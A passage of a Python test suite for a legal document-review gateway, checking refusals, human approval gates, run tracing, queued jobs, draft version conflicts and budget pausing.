        check("possible fraud into an errand" in _t4m["action"]["reason"],
              "...and the reason says why REPLACE would be the wrong instruction")

        # The store refuses a contradiction even if a future caller builds one by hand.
        try:
            _t4_store.write_document_check(
                {"check_id": "33333333-3333-4333-8333-333333333333",
                 "document_id": _t4_did, "as_of": "2026-10-05",
                 "checked_at": "2026-10-05T00:00:00Z",
                 "verification_status": "INCOMPLETE_VERIFICATION",
                 "validity_status": _t4dval.EXPIRED, "action": _t4dval.KEEP,
                 "action_reason": "this contradiction must never be storable at all"})
            check(False, "KEEP on an EXPIRED document must be refused by the store")
        except Exception as _e:                                  # noqa: BLE001
            check("KEEP requires a document in force" in str(_e),
                  f"KEEP on an EXPIRED document is refused by the STORE as well as by "
                  f"`act()` -- 023 restates it as a CHECK because a second writer reaches "
                  f"the table and not the API ({type(_e).__name__})")

        # A bad as_of is refused rather than defaulted.
        check(_document_check({"document_id": _t4_did, "as_of": "last Tuesday"},
                              _t4_ctx).get("code") == "BAD_REQUEST",
              "an unparseable as_of is refused, not defaulted to today: a date nobody meant "
              "would silently answer a different question from the one asked")
        # A refusal from the verification layer stands as a refusal, with no row written.
        _t4_before = len(_t4_store.read_document_checks())
        check(_document_check({"document_id": "no-such-doc"}, _t4_ctx).get("code")
              == "NOT_FOUND"
              and len(_t4_store.read_document_checks()) == _t4_before,
              "a document we could not read records NO check -- a judgement in the audit "
              "record where there was none would be worse than none")
    # ── move 6: ONE identity for held text, and it is the checker's ─────────
    # `008_decision_evidence.sql` fixed the identity for `runs.law_versions`: "the same
    # identity `public_only.Origin.blob` carries, so O7 (recall) and the O9 (answer cache)
    # compare one thing." `law_versions_of` used to carry its own copy of git's blob formula,
    # and move 6 was about to add a THIRD under a different name. It now delegates to
    # `checker/law_versions`. This check is HERE rather than there because `checker/rings.py`
    # refuses a Ring 0 module that reaches Ring 2 -- and caught the import even inside a test.
    from checker.law_versions import blob_ids as _lv_blob_ids
    check(law_versions_of(SS_TEXTS) == _lv_blob_ids(SS_TEXTS),
          f"`law_versions_of` and checker/law_versions agree EXACTLY, because there is one "
          f"implementation and this is the delegation "
          f"({list(law_versions_of(SS_TEXTS).values())[0][:12]}…)")
    check(all(len(v) == 40 for v in law_versions_of(SS_TEXTS).values()),
          "...and it is still a 40-hex git blob id, the shape 008's column stores")
    import inspect as _t1_inspect
    check("sha1" not in _t1_inspect.getsource(law_versions_of),
          "...and the formula is not duplicated here any more -- a second copy is a second "
          "identity waiting to drift")

    # move 6's done-when: "two runs on different corpus hashes are distinguishable". Proved
    # by composition rather than by mutating the real corpus, which a test must never do.
    # A run records the BLOB ID of each record it read; `checker/law_versions` proves a blob
    # id changes when a byte changes. So the run rows of two deployments on different corpora
    # cannot be equal. What is checked here is the join: that a run's stored versions really
    # are those blob ids, for the records it really read.
    # The gate runs with NO model key (STEP 4a: deterministic stand-ins everywhere), so these
    # asks use the research stand-in. Without it they refuse NO_MODEL *before* retrieval records
    # law_versions, and a fresh clone with no .env goes RED where a dev laptop with a key is
    # green -- which is exactly the fresh-clone promise this restores.
    from agents import research_question as _t1_rq

    def _t1_context(_q, _store):
        _srcs = tuple(s for s, _o in _t1_rq.evidence(_q))
        return Context(store=_store,
                       model_for=((lambda _o: _t1_rq.quoting_model(_srcs)) if _srcs else None))

    _t1_q = ("What is the time limit for filing the annual return under section 92?")
    _t1_store = _MB()
    _t1_ask = _ask({"question": _t1_q}, _t1_context(_t1_q, _t1_store))
    _t1_run = _t1_store.read_run(_t1_ask.get("run_id")) or {}
    _t1_lv = _t1_run.get("law_versions") or {}
    check(_t1_lv and all(k.startswith("corpus/") for k in _t1_lv),
          f"an `ask` run records WHICH held records it read, by repo-relative path "
          f"({sorted(_t1_lv)[:2]})")
    _t1_first = (list(_t1_lv.values()) or ["(none)"])[0]
    check(_t1_lv == _lv_blob_ids(sorted(_t1_lv)),
          f"...and every recorded version IS that file's blob id today -- so a corpus whose "
          f"bytes change necessarily gives a different run row, which is the whole of "
          f"'two runs on different corpora are distinguishable' "
          f"({_t1_first[:12]}…)")
    # ── relevance gate, through the whole Ask path ─────────────────────────
    # Every quote exact, every section the wrong one: a board-quorum question answered from
    # s.103 (general-meeting quorum) must not be ANSWERED -- not in the result, not in the
    # stored run, not in the envelope. Answered from s.174 it is unchanged.
    _rg_q = "What is the quorum for a board meeting?"
    _rg_src = {s.source_id: s for s, _o in _t1_rq.evidence(_rg_q)}

    def _rg_ctx(_sid, _store):
        return Context(store=_store, model_for=lambda _o: _t1_rq.quoting_model((_rg_src[_sid],)))

    _rg_store = _MB()
    _rg_off = _ask({"question": _rg_q}, _rg_ctx("Companies Act 2013, s.103", _rg_store))
    _rg_env = _envelope_for("RESEARCH_QUESTION", _rg_off, as_of="2026-11-01", ctx=Context(),
                            question=_rg_q)
    check(_rg_off.get("status") == "PARTIAL"
          and _rg_off.get("unaddressed") == ["board meeting quorum"]
          and (_rg_store.read_run(_rg_off.get("run_id")) or {}).get("status") == "PARTIAL",
          f"ask: board quorum answered only from s.103 is PARTIAL, and so is the stored run "
          f"({_rg_off.get('status')}, {_rg_off.get('unaddressed')})")
    check(_rg_env["status"] == "PARTIAL"
          and _rg_env["text_blocks"][0]["citation_ids"]
          and "don't address board meeting quorum" in _rg_env["text_blocks"][1]["text"],
          f"...and the envelope is PARTIAL, keeps the cited answer in block 0, and says why next "
          f"({_rg_env['status']}: {[b['text'][:40] for b in _rg_env['text_blocks'][:2]]})")
    _rg_on = _ask({"question": _rg_q}, _rg_ctx("Companies Act 2013, s.174", _MB()))
    _rg_env_on = _envelope_for("RESEARCH_QUESTION", _rg_on, as_of="2026-11-01", ctx=Context(),
                               question=_rg_q)
    check(_rg_on.get("status") == "ANSWERED" and _rg_env_on["status"] == "ANSWERED"
          and not _rg_on.get("unaddressed"),
          f"...the same question answered from s.174 is unchanged "
          f"({_rg_on.get('status')}/{_rg_env_on['status']})")

    _t1_llp = "What does the LLP Act 2008 say about designated partners?"
    _t1_refused = _MB()
    # A DECLINING stand-in, not the quoting one: the real model refused this out-of-held-scope
    # question, whereas a quoting stand-in would answer from a near-miss record. The decline
    # drives REFUSED while retrieval still records law_versions -- "read the law, found no
    # answer", which is exactly what the next check asserts.
    _t1_decline = Context(store=_t1_refused,
                          model_for=lambda _o: (lambda _p: "No held provision answers this."))
    _t1_out = _ask({"question": _t1_llp}, _t1_decline)
    _t1_rrun = _t1_refused.read_run(_t1_out.get("run_id")) or {}
    check(_t1_rrun.get("status") == "REFUSED" and (_t1_rrun.get("law_versions") or {}),
          f"a REFUSED run records them too: an abstention rests on having read the law and "
          f"not found the answer, and a reader six months later needs to know which text "
          f"that was ({_t1_rrun.get('status')}, "
          f"{len(_t1_rrun.get('law_versions') or {})} record(s))")

    # ── the human gate: runs.approve / runs.reject ──────────────────────────
    dstore = _MB()
    dctx = Context(store=dstore, actor="00000000-0000-0000-0000-0000000000a1")
    drun = _review_document({"text": _ss.CLEAN}, dctx)
    rid, item = drun["run_id"], "ss:T1.2"
    good = {"run_id": rid, "item_ref": item,
            "reason": "Inspected the book; the Chairman initialled every page.",
            "quoted_span": "physical minutes book not inspected", "quote_viewed": True}

    # PLAN_23 §1.8: the quote is viewed before a finding is ACCEPTED.
    for unseen, how in (({k: v for k, v in good.items() if k != "quote_viewed"}, "absent"),
                        ({**good, "quote_viewed": False}, "false"),
                        ({**good, "quote_viewed": "false"}, "the STRING 'false'"),
                        ({**good, "quote_viewed": "no"}, "'no'")):
        check(_runs_approve(unseen, dctx).get("code") == "QUOTE_NOT_VIEWED",
              f"an approval with quote_viewed {how} is REFUSED -- a click without the quote "
              f"would be stored as a person's agreement")
    check(dstore.read_decisions(rid) == [],
          "...and none of those refusals wrote a label")
    drun_run = dstore.read_run(rid)
    check(drun_run["law_versions"] == law_versions_of(SS_TEXTS)
          and all(len(b) == 40 for b in drun_run["law_versions"].values()),
          f"a review_document run records the SS-1/SS-2 texts it applied, as git blob ids "
          f"({sorted(drun_run['law_versions'] or {})})")

    check(_runs_approve({**good, "reason": "ok"}, dctx)["code"] == "REASON_REQUIRED",
          "a one-word reason is REFUSED: a decision with no reason records that somebody "
          "clicked, which is the automation bias the gate exists to prevent")
    check(_runs_approve({**good, "quoted_span": ""}, dctx)["code"] == "QUOTE_REQUIRED",
          "...and a decision with no quoted span is refused: the label would be attached "
          "to nothing a person can be shown to have read")
    check(_runs_approve({**good, "item_ref": "ss:T9.9"}, dctx)["code"] == "NOT_FOUND",
          "...and an item the run never served is refused: it would be a label about nothing")
    check(_runs_approve({**good, "run_id": "no-such-run"}, dctx)["code"] == "NOT_FOUND",
          "...and so is an unknown run")
    check(_runs_approve(good, Context(actor="a"))["code"] == "NO_STORE",
          "...and with no store the decision is REFUSED, not accepted and dropped: a human "
          "decision that is not stored is one that was not made")

    rec = _runs_approve(good, dctx)
    check(rec["status"] == "RECORDED" and rec["decision"] == "APPROVED",
          f"a reasoned approval is recorded ({rec.get('status')})")
    check(rec["actor_id"] == "00000000-0000-0000-0000-0000000000a1" and rec["decided_at"],
          "...with the actor who made it and the time they made it")
    check(rec["reason"] == good["reason"] and rec["quoted_span"] == good["quoted_span"],
          "...and the reason and the span they were shown, verbatim: that IS the label")
    check(rec["quote_viewed"] is True,
          "...and that the quote was viewed")
    check(rec["law_versions"] == drun_run["law_versions"],
          "...and the law versions the finding was computed against, copied from the run")
    again = _runs_approve({**good, "reason": "Actually I changed my mind about this."}, dctx)
    check(again["code"] == "ALREADY_DECIDED",
          "...and a second decision on the same item is refused rather than overwriting the "
          "label that is the point of storing it")
    rej = _runs_reject({**good, "item_ref": "ss:T1.3",
                        "reason": "Blank pages were not scored out; the book shows three."},
                       dctx)
    check(rej["decision"] == "REJECTED" and len(dstore.read_decisions(rid)) == 2,
          "...while a rejection on a different item is a separate label")
    rej2 = _runs_reject({k: v for k, v in good.items() if k != "quote_viewed"}
                        | {"item_ref": "ss:T1.4a",
                           "reason": "Signed after the thirty-day window, per the book.",
                           "law_versions": {"corpus/reference/SS-1.txt": "f" * 40}}, dctx)
    check(rej2.get("status") == "RECORDED" and rej2["quote_viewed"] is False,
          f"a REJECTION without the quote is recorded, as not viewed: it withholds a "
          f"finding rather than clearing one ({rej2.get('status')}/{rej2.get('code')})")
    check(rej2.get("law_versions") == drun_run["law_versions"],
          "...and law_versions supplied by the CALLER are ignored: a reviewer cannot know "
          "what a run read, and a label must not be filed against versions it never saw")

    # NOT MCP. A tool surface that can approve a finding is one that can clear a review.
    mcp_names = {t.name for t in mcp_tools()}
    check(not {n for n in mcp_names if "approve" in n or "reject" in n},
          f"runs.approve and runs.reject are NOT exposed over MCP {sorted(mcp_names)}")
    check("runs.approve" in rest_spec() and "runs-approve" in
          {c["command"] for c in cli_spec().values()},
          "...while REST and the CLI both carry them, which is where a person acts")

    # ── events.assess, on all THREE generated surfaces ──────────────────────
    from checker import events as _events

    ea = _events_assess({"event": "share_allotment",
                         "facts": {"foreign_investor": True}}, Context())
    check(ea["status"] == "PARTIAL",
          f"events.assess on a foreign-investor allotment is PARTIAL ({ea['status']})")
    bodies = {f["body_id"]: f for f in ea["findings"]}
    check("FEMA1999" in bodies and bodies["FEMA1999"]["handling"] == "REFUSED",
          f"...engaging FEMA1999 with its named refusal {sorted(bodies)}")
    check("Foreign Exchange Management Act" in bodies["FEMA1999"]["text"],
          "...whose text names the body, so a reader sees what is not held")
    check(bodies["CA2013"]["body_status"] == "IN_CORPUS",
          "...and the held body carries its status from the register")
    check(all(f["text"].strip() for f in ea["findings"]),
          "...every engaged body says SOMETHING: silence would read as no obligation found")
    check("not been reviewed by a lawyer" in ea["note"],
          "...and the reply says the table is not lawyer-reviewed")
    stamp = _events_assess({"event": "commercial_contract"}, Context())
    st = {f["body_id"]: f for f in stamp["findings"]}["STAMP"]
    check(st["handling"] == "UNCLASSIFIED",
          f"stamp duty with no State is UNCLASSIFIED, not a guess ({st['handling']})")

    check(_events_assess({"event": ""}, Context())["code"] == "BAD_REQUEST",
          "a missing event is refused, naming the ones that exist")
    check(_events_assess({"event": "no_such_event"}, Context())["code"] == "BAD_REQUEST",
          "...as is an undeclared event")
    check(_events_assess({"event": "share_allotment", "facts": {"colour": "red"}},
                         Context())["code"] == "BAD_REQUEST",
          "...and a fact this table does not read is REFUSED, not ignored: a fact silently "
          "dropped reads as one that was taken into account")
    check(_events_assess({"event": "share_allotment", "facts": "listed"},
                         Context())["code"] == "BAD_REQUEST",
          "...and facts must be an object")

    # REST
    check(rest_spec()["events.assess"]["method"] == "POST"
          and rest_spec()["events.assess"]["path"] == "/v2/events/assess",
          f"REST exposes it at {rest_spec()['events.assess']['path']}")
    check(rest_spec()["events.assess"]["required"] == ("event",),
          f"...with `event` required and `facts` optional "
          f"({rest_spec()['events.assess']['required']})")
    # MCP -- it is READ-ONLY, so unlike runs.approve it belongs here.
    mcp_names = {t.name for t in mcp_tools()}
    check(f"{MCP_NAMESPACE}.events.assess" in mcp_names,
          f"MCP carries it, because it is read-only and calls no model {sorted(mcp_names)}")
    check("events.assess" not in write_verbs(),
          "...and it is not a write verb, which is WHY it may appear there")
    # CLI
    check(cli_spec()["events.assess"]["command"] == "events-assess",
          f"the CLI command is {cli_spec()['events.assess']['command']}")
    # ── company facts at the VERB boundary (PLAN_26 S2-alt) ─────────────────
    # The module tests prove the rules; these prove the wiring, which is where the
    # user-facing guarantee actually lives.
    from checker.sources import mca_fixture as _fx
    _ctx = Context()
    _un = [{"field": "state", "value": "Maharashtra"}, {"field": "listed", "value": "yes"}]
    _r = by_name()["events.assess"].run(
        {"event": "commercial_contract", "company_facts": _un}, _ctx)
    check(_r["company_facts"]["used"] == []
          and len(_r["company_facts"]["pending_confirmation"]) == 2,
          "events.assess uses NO unconfirmed company fact, and reports both as pending")
    _stamp = [f for f in _r["findings"] if f["body_id"] == "STAMP"]
    check(_stamp and _stamp[0]["handling"] == "UNCLASSIFIED",
          "...so STAMP stays UNCLASSIFIED: an unconfirmed State does not pick a regime")
    _r2 = by_name()["events.assess"].run(
        {"event": "commercial_contract",
         "company_facts": [dict(x, confirmed=True) for x in _un]}, _ctx)
    check([f["field"] for f in _r2["company_facts"]["used"]] == ["listed", "state"]
          or sorted(f["field"] for f in _r2["company_facts"]["used"]) == ["listed", "state"],
          "...and once CONFIRMED both are used")
    _stamp2 = [f for f in _r2["findings"] if f["body_id"] == "STAMP"]
    check(_stamp2 and _stamp2[0]["handling"] != "UNCLASSIFIED",
          f"...which moves STAMP off UNCLASSIFIED ({_stamp2[0]['handling']}) -- the "
          f"confirmation is doing visible work, not decorating a payload")
    _r3 = by_name()["events.assess"].run(
        {"event": "commercial_contract", "facts": {"state": "Kerala"},
         "company_facts": [dict(x, confirmed=True) for x in _un]}, _ctx)
    check(_r3["status"] == "REFUSED" and "not ours to choose" in _r3["detail"],
          "a State given twice, differently, is REFUSED rather than resolved by precedence")
    _bad = by_name()["events.assess"].run(
        {"event": "commercial_contract",
         "company_facts": [{"field": "director_name", "value": "X"}]}, _ctx)
    check(_bad["status"] == "REFUSED" and "personal data" in _bad["detail"],
          "a director_name company fact is REFUSED at the verb")

    _x = by_name()["company_facts.extract"].run(
        {"text": _fx.master_data_text(), "uploaded_on": "2026-10-01"}, _ctx)
    check(len(_x["facts"]) == 8 and _x["tier"] == "CLIENT" and _x["confirm_required"],
          f"company_facts.extract returns 8 unconfirmed CLIENT-tier facts "
          f"({len(_x['facts'])})")
    check(all(f["quoted_span"] and not f["confirmed"] and not f["can_verify"]
              for f in _x["facts"]),
          "...each with a span, unconfirmed, and never verifiable")
    _blob = repr(_x)
    check(all(d not in _blob and n not in _blob
              for d, n in _fx.SYNTHETIC_DIRECTORS),
          "...and no director name or DIN in the payload")
    check(by_name()["company_facts.extract"].run(
              {"text": "", "uploaded_on": "2026-10-01"}, _ctx)["code"] == "CANNOT_READ",
          "an upload with no text is CANNOT_READ, never an empty set of facts")
    check(by_name()["company_facts.extract"].run(
              {"text": "Company Master Data\nCIN  U00000ZZ0000ZZZ000000",
               "uploaded_on": ""}, _ctx)["status"] == "REFUSED",
          "...and an extract with no upload date is refused: the label names the date")
    check("company_facts.extract" not in write_verbs(),
          "company_facts.extract does not write: it parses and returns, and a TOOL may "
          "never confirm a fact -- confirmation is a person's act, and it arrives as an "
          "argument")

    check(cli_spec()["events.assess"]["flags"] == {"--event": True, "--facts": False,
                                                   "--company-facts": False},
          f"...with the same fields as the other two surfaces "
          f"({cli_spec()['events.assess']['flags']})")
    check(len(_events.BY_KEY) == 8,
          f"...covering the eight events the table declares ({len(_events.BY_KEY)})")

    # ── the durable path, end to end (PLAN_23 O2) ───────────────────────────
    from gateway.jobs import MemoryQueue as _MQ
    from gateway.store import MemoryBackend as _MB2
    from gateway.worker import drain as _drain
    from checker.ss import defects as _ss2

    qstore, qq = _MB2(), _MQ()
    qctx = Context(tenant="gate-firm", store=qstore, queue=qq)
    sub = _runs_submit({"intent": "review_document",
                        "args": {"text": _ss2.CLEAN, "meeting_date": "2026-05-12",
                                 "entry_date": "2026-06-30"}}, qctx)
    check(sub["status"] == "PLANNED" and sub.get("run_id"),
          f"runs.submit returns a run id IMMEDIATELY, with status PLANNED "
          f"({sub.get('status')}) -- the answer arrives later")
    rid = sub["run_id"]
    check(_runs_get({"run_id": rid}, qctx)["status"] == "PLANNED",
          "...and the run is readable straight away, before any worker has touched it")
    check(qstore.read_run(rid)["steps"] == [],
          "...with no steps yet: nothing was executed inside the request")
    check(qq.depth() == 1, f"...and exactly one job is queued ({qq.depth()})")

    outs = _drain(queue=qq, store=qstore, handlers=queue_handlers(qctx))
    check(len(outs) == 1 and outs[0].status == "ANSWERED",
          f"a worker takes it to a terminal status ({outs and outs[0].status})")
    done = _runs_get({"run_id": rid}, qctx)
    check(done["status"] == "ANSWERED", "...and runs.get now serves the final status")
    trace_q = _runs_trace({"run_id": rid}, qctx)["steps"]
    check([st["capability"] for st in trace_q] == ["intake", "document", "verify"],
          f"...and the trace is the plan agents/plans.py declares "
          f"({[st['capability'] for st in trace_q]})")
    check(all(st.get("idempotency_key") for st in trace_q),
          "...every step carrying the key that makes a retry a no-op")

    # The queue path and the request path are the SAME handler, so they must agree.
    direct = _review_document({"text": _ss2.CLEAN, "meeting_date": "2026-05-12",
                               "entry_date": "2026-06-30"}, Context())
    stored = qstore.read_run(rid)["result"]
    check(stored and stored["doc_type"] == direct["doc_type"]
          and stored["defect_count"] == direct["defect_count"],
          "the queued run and the synchronous verb give the SAME answer -- they are one "
          "handler, called twice, not two implementations")

    # Submitting the same work twice is two runs; a second JOB for one run is refused.
    again = _runs_submit({"intent": "review_document", "args": {"text": _ss2.CLEAN}}, qctx)
    check(again["run_id"] != rid, "a second submission is a second run, with its own id")
    check(_runs_submit({"intent": "nonsense", "args": {}}, qctx)["code"] == "BAD_REQUEST",
          "an undeclared intent is refused rather than queued to fail later")
    check(_runs_submit({"intent": "review_document"}, Context())["code"] == "NO_STORE",
          "...and with no durable queue, submit REFUSES rather than accepting work it "
          "cannot keep")

    # ── cancel: a request, honoured at a boundary ───────────────────────────
    cq, cs = _MQ(), _MB2()
    cctx = Context(tenant="gate-firm", store=cs, queue=cq)
    csub = _runs_submit({"intent": "review_document", "args": {"text": _ss2.CLEAN}}, cctx)
    crid = csub["run_id"]
    cancelled = _runs_cancel({"run_id": crid}, cctx)
    check(cancelled["status"] == "CANCEL_REQUESTED",
          f"runs.cancel is accepted on a queued run ({cancelled.get('status')})")
    _drain(queue=cq, store=cs, handlers=queue_handlers(cctx))
    crow = _runs_get({"run_id": crid}, cctx)
    check(crow["status"] == "REFUSED" and crow["refusal_code"] == "CANCELLED",
          f"...and the run ends REFUSED / CANCELLED ({crow.get('status')}/"
          f"{crow.get('refusal_code')}) -- a person decided this, so it is not FAILED")
    ctrace = _runs_trace({"run_id": crid}, cctx)["steps"]
    check(ctrace and any(st["status"] == "CANCELLED" for st in ctrace),
          f"...with a CANCELLED step saying where it stopped "
          f"({[st['status'] for st in ctrace]})")
    check(_runs_cancel({"run_id": crid}, cctx)["code"] == "NOT_CANCELLABLE",
          "...and cancelling it again is refused: a finished run is not cancelled "
          "retroactively, because its trace is what happened")
    check(_runs_cancel({"run_id": str(__import__("uuid").uuid4())}, cctx)["code"]
          == "NOT_CANCELLABLE",
          "...and an unknown run gets the SAME answer, so the code does not leak which "
          "run ids exist")
    check(_runs_cancel({"run_id": "x"}, Context())["code"] == "NO_STORE",
          "...while with no queue at all it says so rather than claiming to have cancelled")

    # ── a verb that answers leaves a TRACE, which is what runs.trace serves ──
    from gateway.store import MemoryBackend
    from agents import review_contract as _rc
    st = MemoryBackend()
    fx = _rc.fixtures()[0]
    # A model is INJECTED for every check below. The gate must reach no network: a suite
    # that calls Azure is a suite that fails on a plane and bills a student account.
    c2 = Context(store=st, model_for=lambda origins: _rc.fixture_model(fx), synthetic_fixtures=True)
    out = _review_contract({"text": fx.text, "name": fx.id, "test_data": True}, c2)
    check(out.get("run_id"), "review_contract returns the id of the run it wrote")
    _a = _ask({"question": "how many meetings of the Board must a company hold"},
              Context(store=MemoryBackend(),
                      model_for=lambda origins: (lambda prompt: "")))
    check("answer" in _a,
          "ask returns the ANSWER as well as the verdict -- to_dict() carries provisions "
          "and a status, and a verb that returned everything about an answer except the "
          "answer is not serving one")
    trace = _runs_trace({"run_id": out["run_id"]}, c2)
    check([s["capability"] for s in trace["steps"]]
          == ["intake", "document", "playbook"],
          f"...and runs.trace serves its steps, in the order agents/plans.py declares "
          f"({[s['capability'] for s in trace['steps']]})")
    row = _runs_get({"run_id": out["run_id"]}, c2)
    check(row["intent"] == "review_contract" and row["status"] == "ANSWERED",
          "...and runs.get serves the run itself")
    stored = st.read_run(out["run_id"])
    check(len(stored["propositions"]) == len(out["findings"]),
          f"one proposition per finding ({len(stored['propositions'])} for "
          f"{len(out['findings'])} findings)")
    # With no model nothing is extracted, so every finding is MISSING -- and NOTHING may
    # be recorded as VERIFIED. Derived by subtraction, the first version recorded all ten.
    # "Nothing extracted" is now a MODEL that finds nothing, not the absence of one:
    # the verbs serve a real route today, so absence of a model is a refusal instead.
    nomodel = Context(store=MemoryBackend(), synthetic_fixtures=True,
                      model_for=lambda origins: (lambda prompt: "{}"))
    o_nm = _review_contract({"text": fx.text, "name": fx.id, "test_data": True},
                            nomodel)
    st_nm = nomodel.store.read_run(o_nm["run_id"])
    check({f["status"] for f in o_nm["findings"]} == {"MISSING", "MATCHES"},
          f"a model that extracts NOTHING leaves every finding MISSING, "
          f"except the must_be_absent rules, which MATCH on absence "
          f"({sorted({f['status'] for f in o_nm['findings']})})")
    check({p["status"] for p in st_nm["propositions"]} == {"UNVERIFIED"},
          f"...and NOT ONE proposition is VERIFIED "
          f"({sorted({p['status'] for p in st_nm['propositions']})}): a clause that was "
          f"never extracted cannot have been verified")
    check({p["status"] for p in stored["propositions"]} <= {"VERIFIED", "UNVERIFIED"},
          "...carrying an L0 verification status, never a playbook status: writing "
          "DEVIATES into a column that means VERIFIED would put a company standard where "
          "a legal verdict is read from")
    check(all(p["source_ref"].startswith("playbook:") for p in stored["propositions"]),
          "...and naming the rule it came from")
    check(_review_contract({"text": fx.text, "test_data": True},
                           Context(model_for=lambda o: _rc.fixture_model(fx), synthetic_fixtures=True)
                           ).get("run_id") is None,
          "with NO store the verb still answers, and says the run id is None rather than "
          "handing back one that resolves to nothing")

    # ── PLAN_22 D3: a real client contract may not go to an unconfirmed region ──
    import os as _os
    from checker.azure_model import ACCEPT_REGION_ENV, DEPLOYMENT_REGION
    held = _os.environ.pop(ACCEPT_REGION_ENV, None)
    try:
        real = _review_contract(
            {"text": fx.text, "name": "acme-real.docx"},
            Context(store=MemoryBackend()))
        check(real.get("status") in ("FAILED", "REFUSED"),
              f"a contract NOT marked test data does not produce findings "
              f"({real.get('status')})")
        check("findings" not in real,
              "...and no findings are served from a document that was never sent")
        check(DEPLOYMENT_REGION in str(real),
              f"...the reason naming the region ({DEPLOYMENT_REGION}), so a reader knows "
              f"it is a residency decision and not an outage")
    finally:
        if held is not None:
            _os.environ[ACCEPT_REGION_ENV] = held

    # ── A1 item 7: the optimistic lock on draft.revise ──────────────────────
    # 012_drafts.sql says "(draft_id, version) is the primary key ... two concurrent saves
    # cannot both become version 3. One conflicts, and draft.revise reports it rather than
    # silently overwriting a colleague's revision." That guarantee was NOT delivered:
    # _save_version never passed `version`, so append_draft_version computed
    # len(rows) + 1 at WRITE time. Two writers who both read v1 therefore produced v2 and
    # v3 and BOTH succeeded -- a lost update with no conflict anywhere.
    _lk = Context(store=MemoryBackend(), clock=lambda: "2026-10-04T00:00:00Z")
    _made = _draft_create({"title": "Board resolution", "body": "v1 text"}, _lk)
    _did = _made["draft_id"]
    _base = _made.get("version") or 1

    # Two writers, same base version. Exactly one may win.
    _w1 = _draft_revise({"draft_id": _did, "base_version": _base, "body": "writer one"}, _lk)
    _w2 = _draft_revise({"draft_id": _did, "base_version": _base, "body": "writer two"}, _lk)
    _wins = [r for r in (_w1, _w2) if r.get("status") != "REFUSED"]
    _loses = [r for r in (_w1, _w2) if r.get("status") == "REFUSED"]
    check(len(_wins) == 1 and len(_loses) == 1,
          f"two writers on the SAME base version: exactly one succeeds "
          f"({[r.get('code') or 'OK' for r in (_w1, _w2)]})")
    check(_loses and _loses[0].get("code") == "CONFLICT",
          f"...and the loser gets a typed CONFLICT ({_loses[0].get('code') if _loses else None})")
    check(_loses and _loses[0].get("base_version") == _base
          and _loses[0].get("latest_version") == _base + 1,
          f"...naming BOTH versions: the base it was given and the one that beat it "
          f"({_loses[0].get('base_version') if _loses else None} vs "
          f"{_loses[0].get('latest_version') if _loses else None})")

    _hist = ctx_versions = _draft_versions({"draft_id": _did}, _lk)
    check(len(_hist.get("versions") or []) == 2,
          f"...and only ONE new version exists, so nothing was merged silently "
          f"({len(_hist.get('versions') or [])})")

    # base_version is required: a revise that does not say what it was based on cannot be
    # checked, and defaulting it to "latest" is the lost update with extra steps.
    _nb = _draft_revise({"draft_id": _did, "body": "no base"}, _lk)
    check(_nb.get("code") == "BAD_REQUEST" and "base_version" in _nb.get("detail", ""),
          f"a revise with NO base_version is refused rather than assuming the latest "
          f"({_nb.get('code')})")

    # A stale base from further back is also a conflict, not an overwrite.
    _stale = _draft_revise({"draft_id": _did, "base_version": _base, "body": "stale"}, _lk)
    check(_stale.get("code") == "CONFLICT",
          f"a base version two behind is still a CONFLICT ({_stale.get('code')})")

    # And the happy path still works, from the CURRENT latest.
    _cur = (_draft_status(_lk, _did) or {}).get("version")
    _good = _draft_revise({"draft_id": _did, "base_version": _cur, "body": "onward"}, _lk)
    check(_good.get("status") != "REFUSED" and _good.get("version") == _cur + 1,
          f"revising from the CURRENT latest succeeds and lands at version {_cur + 1} "
          f"({_good.get('version')})")
    _fake_approval = _draft_revise(
        {"draft_id": _did, "base_version": _cur + 1, "body": "onward", "approved_by": "N. Lawyer"}, _lk)
    check(_fake_approval.get("code") == "IDENTITY_REQUIRED"
          and _draft_status(_lk, _did).get("version") == _cur + 1,
          "a caller-supplied reviewer name is refused and writes no approval or version")

    # ── move 2: review_table.status carries the budget state ────────────────
    # PR #3 found this live: no key in the status response mentions the budget, so a table
    # that paused part-way reads as a table whose cells are PENDING -- and PENDING already
    # means "not attempted yet". A state a caller can learn only once, from a response it
    # may not have kept, is not a state. See .claude/loops/DECISION_grid_budget_state.md.
    from datetime import date as _mdate

    from backend.budget import DEFAULT_MODEL as _MDM
    from backend.budget import DAILY_CAP_INR as _MDAILY
    from backend.budget import BudgetTracker as _MBT
    from backend.budget import cost_inr as _mcost
    from agents.review_grid import CELL_INPUT_TOKENS as _MIN_T
    from agents.review_grid import CELL_MAX_TOKENS as _MMAX_T

    class _MMem:
        def __init__(self):
            self.d = {}

        def read(self):
            return dict(self.d)

        def write(self, data):
            self.d = dict(data)

        def update(self, fn):
            self.d = dict(fn(dict(self.d)))
            return dict(self.d)

    _mper = _mcost(_MDM, _MIN_T, _MMAX_T)
    _mtracker = _MBT(store=_MMem(), today=_mdate(2026, 10, 5))
    # Headroom for two cells of six, so the cap runs out MID-table. A cap of zero would
    # pause on the first cell and prove nothing about the dispatched count.
    _mtracker.record_call(max(0.0, _MDAILY - _mper * 2.5))

    from gateway.jobs import MemoryQueue as _MQ2
    _mctx = Context(tenant="gate-firm", store=MemoryBackend(), queue=_MQ2(),
                    clock=lambda: "2026-10-05T00:00:00Z",
                    # 028: the caller's own uploads, so the hashes are theirs to read.
                    documents={h * 64: {"text": "synthetic"} for h in "abc"})
    # `_review_table_create` reads the ledger through `_ledger()`, not from ctx, so the
    # tracker is injected there. Patched rather than mocked away: the verb must use a REAL
    # BudgetTracker, because the pause comes from `reserve()` refusing and nothing else.
    #
    # Patched on `globals()`, NOT via `import gateway.verbs as _mv`. Run as
    # `python3 gateway/verbs.py` this module is `__main__`, so that import binds a SECOND
    # copy and the patch lands on an object the verb never reads -- six cells reserved and
    # no pause, which is what it did. A1's chaos test made the identical mistake with
    # `TIMEOUT` and its commit says so; I made it again here.
    _mreal_ledger = model_access._ledger
    model_access._ledger = lambda: _mtracker
    try:
        _mcreate = _review_table_create(
        {"name": "paused mid-table",
         "document_ids": ["a" * 64, "b" * 64, "c" * 64],
             "columns": [{"name": "governing law", "kind": "text",
                          "question": "Which law?"},
                         {"name": "term end", "kind": "date",
                          "question": "When does it end?"}]},
            _mctx)
        _mstatus = _review_table_status({"grid_id": _mcreate.get("grid_id", "")}, _mctx)
    finally:
        model_access._ledger = _mreal_ledger
    check(_mcreate.get("status") != "REFUSED",
          f"a six-cell table is created ({str(_mcreate)[:70]})")
    check(_mcreate["scheduled"].get("paused_budget") is True,
          f"...and PAUSES at create, which is the hard case ({_mcreate['scheduled']})")

